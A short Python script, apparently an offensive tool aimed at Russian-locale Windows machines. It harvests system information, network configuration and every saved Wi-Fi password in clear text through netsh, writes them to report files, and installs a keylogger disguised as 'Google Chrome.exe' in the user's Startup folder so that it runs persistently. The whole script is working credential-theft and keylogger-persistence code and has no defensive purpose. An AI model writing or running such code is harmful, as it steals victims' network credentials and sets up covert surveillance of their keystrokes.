import time
import shutil
import os
import subprocess
from rich.console import Console
from rich import print


def inject():
    print("[bold red]Injecting keylogger ...[/bold red]")
    shutil.move('./logger/dist/Google Chrome.exe',
                '{0}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Google Chrome.exe'.format(os.environ['appdata']))

def get_system_info(folder):
    print("[bold green]Exporting systeminfo ...[/bold green]")
    results = subprocess.check_output('systeminfo')
    results = results.decode('cp866')
    results = results.replace('\r', '')

    file = open('./reports/{0}_systeminfo.log'.format(folder), 'w')
    file.write(results)
    file.close()

def get_wifi_report(folder):
	
	print("[bold green]Exporting ipconfig ...[/bold green]")
	results = subprocess.check_output('ipconfig')
	results = results.decode('cp866')
	results = results.replace('\r', '')

	file = open('./reports/{0}_networks.log'.format(folder), 'w')
	file.write(results)
	file.close()

	print("[bold green]Exporting networks ...[/bold green]")
	results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
	results = results.decode('cp866')
	results = results.replace('\r', '')

	networks = results.split('Все профили пользователей     :')

	file = open('./reports/{0}_internet.log'.format(folder), 'w')

	for i in range(1, len(networks)):
		try:
			output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles',
                                    'name=\"{0}\"'.format(networks[i].strip()), 'key=clear'])
			output = output.decode('cp866')
		except subprocess.CalledProcessError:
			output = '{0}:\t Ничего нет\n'.format(networks[i].strip())
		file.write(output)
	file.close()

	print("[bold green]Exporting all info ...[/bold green]")
	results = subprocess.check_output(['netsh', 'wlan', 'show', 'all'])
	results = results.decode('cp866')
	results = results.replace('\r', '')

	file = open('./reports/{0}_general.log'.format(folder), 'w')
	file.write(results)
	file.close()


index = int(time.time())
console = Console()

try:
    get_wifi_report(index)
    get_system_info(index)
    inject()
except Exception:
    console.print_exception(show_locals=True)
